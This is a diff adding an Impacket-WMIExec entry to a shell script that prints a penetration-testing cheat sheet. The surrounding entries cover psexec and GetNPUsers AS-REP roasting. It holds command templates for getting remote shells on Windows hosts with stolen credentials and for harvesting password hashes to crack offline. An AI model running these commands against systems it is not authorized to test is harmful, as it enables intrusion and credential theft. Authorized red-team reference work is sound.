@@ -21,6 +21,12 @@ echo -e "${Point} impacket-psexec domain.local/\$user:\$password@\$IP"
 echo -e ""
 
 
+echo -e "${Frame}###${End} ${Title}Impacket-WMIExec${End} ${Frame}###${End}"
+echo -e "${Comment}Impacket’s wmiexec.py uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host.${End}"
+echo -e "${Point} impacket-wmiexec domain.local/\$user:\$password@\$IP"
+echo -e ""
+
+
 echo -e "${Frame}###${End} ${Title}Impacket-GetNPUsers${End} ${Frame}###${End}"
 echo -e "${Comment}Impacket’s GetNPUsers.py will attempt to harvest the non-preauth AS_REP responses and will be encrypted with the user’s password, which can then be cracked offline.${End}"
 echo -e "${Point} impacket-GetNPUsers -dc-ip \$IP domain.local/ -usersfile users.txt -format hashcat [-outputfile hashes.txt]"
